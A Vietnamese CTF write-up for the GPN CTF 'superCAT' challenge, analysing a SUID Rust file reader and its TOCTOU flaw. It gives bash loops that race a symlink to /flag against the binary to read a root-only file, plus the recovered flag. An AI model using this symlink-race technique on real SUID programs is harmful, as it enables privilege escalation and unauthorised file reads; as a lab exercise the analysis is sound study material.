---
layout: post
title: "GPN CTF : super cat misc"
tags: [writeup, ctf]
---
{% raw %}

superCAT finished (Miscellaneous) by s1nn105
---

Mô tả:

SuperCat. DO NOT EAT. The better, newer, more tasteful version of cat. Obv. highly opinionated

### Link file ```https://drive.google.com/file/d/1D1zX8IGlmEgu3_cxn1ebu4UPJG6JYjHC/view?usp=sharing```

---

### Đầu tiên mình tải chall về VM Kali Linux

<img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/bc53e236-e27b-4135-99ba-9bd08b4ee9c2" />

Sau đó mình phân giải nén file supercat.tar.gz ra

<img width="684" height="411" alt="image" src="https://github.com/user-attachments/assets/4437d3d1-7a64-45b5-b99f-ba383949b4fb" />

 ta phân tích dockerfile 

```
cat supercat/Dockerfile
```
<img width="1093" height="510" alt="image" src="https://github.com/user-attachments/assets/7e754017-17ef-4f65-875c-a1d5ed8073b7" />

```
FROM rust:1.95-bullseye AS build
COPY . /challenge
WORKDIR /challenge
RUN cargo build --release

FROM debian:bullseye AS flag
ARG Flag "GPNCTF{dummyflag}"
RUN echo ${Flag} > /flag

FROM debian:bullseye AS challenge
RUN useradd -m -u 1000 -s /bin/bash ctf
RUN apt update && apt install socat -y && apt clean

COPY --from=build --chown=root:root --chmod=4755 /challenge/target/release/supercat /usr/local/bin/supercat
COPY --from=flag --chown=root:root --chmod=0400 /flag /flag

USER ctf
WORKDIR /home/ctf
EXPOSE 1337
ENTRYPOINT ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:bash"]
```
### có các điểm chú ý:

--chmod=4755	SUID bit → chạy với quyền root

--chmod=0400	Flag chỉ root đọc được

USER ctf	Chạy với user ctf (uid=1000)

socat ... bash	Mỗi kết nối được 1 shell mới


### Sau khi xem Dockerfile, mình phân tích tiếp file main.rs - đây là nơi chứa lỗ hổng chính.
```
cat supercat/src/main.rs
```
### Src code:
```
use std::fs;
use std::os::unix::fs::MetadataExt;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

#[derive(Debug)]
struct Permissions {
    uid: u32,
    gid: u32,
    groups: Vec<u32>,
}

fn parse_u32_line(line: &str) -> Vec<u32> {
    /*parses eg
    uid: <num> <num>*/
    line.split_whitespace()
        .skip(1) //name
        .filter_map(|v| v.parse::<u32>().ok())
        .collect()
}

fn get_permissions() -> Permissions {
    let status = std::fs::read_to_string(format!("/proc/{}/status", std::process::id()))
        .expect("could not read own perms");
    let mut uid: u32 = 0;
    let mut gid: u32 = 0;
    let mut groups: Vec<u32> = vec![];
    // format is real effective safed fs for uid an gid
    // we want real
    for l in status.lines() {
        if l.starts_with("Uid") {
            uid = *(parse_u32_line(l).get(0).expect("could not get uid"));
        }
        if l.starts_with("Gid") {
            gid = *(parse_u32_line(l).get(0).expect("could not get gid"));
        }
        if l.starts_with("Groups") {
            groups = parse_u32_line(l);
        }
    }
    Permissions { uid, gid, groups }
}

fn grant_read(file: &Path) {
    let content = fs::read_to_string(file).expect("Could not read file as string");
    print!("{}", content);
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        println!("Usage: {} <file>", args[0]);
        std::process::exit(1);
    }
    let file = Path::new(&args[1]);
    let file_meta = std::fs::metadata(file).expect("could not get file info");
    // hail to unix
    let fs_mode = file_meta.permissions().mode();
    let user_perms = get_permissions();
    //same user
    if (user_perms.uid == file_meta.uid() && (fs_mode & 0o400) != 0) {
        grant_read(file);
    }
    if (user_perms.gid == file_meta.gid()) && (fs_mode & 0o040) != 0 {
        grant_read(file);
    }
    //check other groups
    if user_perms.groups.contains(&(file_meta.gid())) && (fs_mode & 0o040) != 0 {
        grant_read(file)
    }
    if (fs_mode & 0o004) != 0 {
        grant_read(file)
    }
    println!("this super cat wont be tricked by your pesky bribery attempts. Maybe next time try gourmet treats instead of  dog food");
}
                                                                                                                                                 
```

### Phân tích từng phần quan trọng:
Hàm get_permissions() - Lấy real UID

```
rust
fn get_permissions() -> Permissions {
    let status = std::fs::read_to_string(format!("/proc/{}/status", std::process::id()))
        .expect("could not read own perms");
    // ...
    for l in status.lines() {
        if l.starts_with("Uid") {
            uid = *(parse_u32_line(l).get(0).expect("could not get uid"));
            //                     ^^^^^^^^ LẤY CỘT 0 = REAL UID (ctf=1000)
        }
    }
}
```
 Điểm quan trọng: Code lấy real UID (cột đầu tiên) thay vì effective UID.

Khi chạy SUID binary: real UID = 1000 (ctf), effective UID = 0 (root)

Hàm grant_read() - Không return sau khi đọc
```
fn grant_read(file: &Path) {
    let content = fs::read_to_string(file).expect("Could not read file as string");
    print!("{}", content);
}
```

`grant_read()` chạy với **effective UID = root** (do SUID) → có thể đọc **mọi file** kể cả `/flag`

### Điểm mấu chốt: hàm này **không có `return`** sau khi đọc xong, và trong `main()` cũng **không có `return`** sau mỗi `grant_read()`:

```rust
if (user_perms.uid == file_meta.uid() && (fs_mode & 0o400) != 0) {
    grant_read(file); // đọc xong → KHÔNG return, tiếp tục chạy xuống
}
if (user_perms.gid == file_meta.gid()) && (fs_mode & 0o040) != 0 {
    grant_read(file); // có thể đọc thêm lần nữa
}
// ...
```

### Nhưng cái này không phải lỗ hổng chính. Lỗ hổng chính là **TOCTOU**.

### Lỗ hổng chính: TOCTOU (Time-of-Check Time-of-Use)

### Trong `main()`, chương trình dùng **cùng một `path`** cho 2 thao tác riêng biệt

```rust
let file = Path::new(&args[1]);

// THAO TÁC 1: đọc metadata tại path → kiểm tra uid
let file_meta = std::fs::metadata(file).expect("could not get file info");

// ... check quyền ...

if (user_perms.uid == file_meta.uid() && (fs_mode & 0o400) != 0) {
    // THAO TÁC 2: mở file tại path → đọc nội dung
    grant_read(file);
}
```

Giữa **THAO TÁC 1** và **THAO TÁC 2** có một **khoảng thời gian nhỏ**. Đây chính là **race window**.

```
THAO TÁC 1: metadata("/race")       → thấy: owner=ctf, mode=400 ✓ → pass
             ↕ ← THAY /race THÀNH SYMLINK → /flag TRONG KHOẢNG NÀY
THAO TÁC 2: read_to_string("/race") → follow symlink → mở /flag bằng quyền root
             → IN RA NỘI DUNG /flag 🎉
```

---

### Ý tưởng

Tạo 2 terminal kết nối vào server cùng lúc:

Terminal 1: liên tục thay `~/race_dir/race` qua lại giữa file thật (owned by ctf) và symlink trỏ tới `/flag`

Terminal 2: liên tục gọi `supercat ~/race_dir/race`, khi timing đúng thì đọc được `/flag`

### Script

Terminal 1 tạo file thật rồi xóa thay bằng symlink, lặp liên tục. Terminal 2 gọi `supercat` liên tục và lọc ra flag.
**Terminal 1** — mở ncat, tạo race loop:

```bash
ncat --ssl grilled-filet-wrapped-in-emulsified-spaetzle-nsqe.gpn24.ctf.kitctf.de 443
```

```bash
mkdir -p ~/race_dir
echo test > ~/race_dir/myfile
chmod 400 ~/race_dir/myfile
while true; do
    rm -f ~/race_dir/race
    cp ~/race_dir/myfile ~/race_dir/race
    rm -f ~/race_dir/race
    ln -sf /flag ~/race_dir/race
done
```
<img width="1920" height="979" alt="image" src="https://github.com/user-attachments/assets/09bf39a9-23b4-491c-8ef4-c264477614f8" />

**Terminal 2** — mở ncat mới, liên tục gọi supercat:

```bash
ncat --ssl grilled-filet-wrapped-in-emulsified-spaetzle-nsqe.gpn24.ctf.kitctf.de 443
```

```bash
while true; do supercat ~/race_dir/race 2>/dev/null; done | grep -v "tricked"
```

<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/6c4b66b5-0d68-4699-a891-db7c62085149" />


Khi timing đúng, flag xuất hiện xen kẽ giữa các dòng `test`:

```
test
test
GPNCTF{Rust_IS_ShiT_CHan6E_MY_MInd}
test
...
```

---

## Flag

```
GPNCTF{Rust_IS_ShiT_CHan6E_MY_MInd}
```

---
**ZeroD**


{% endraw %}
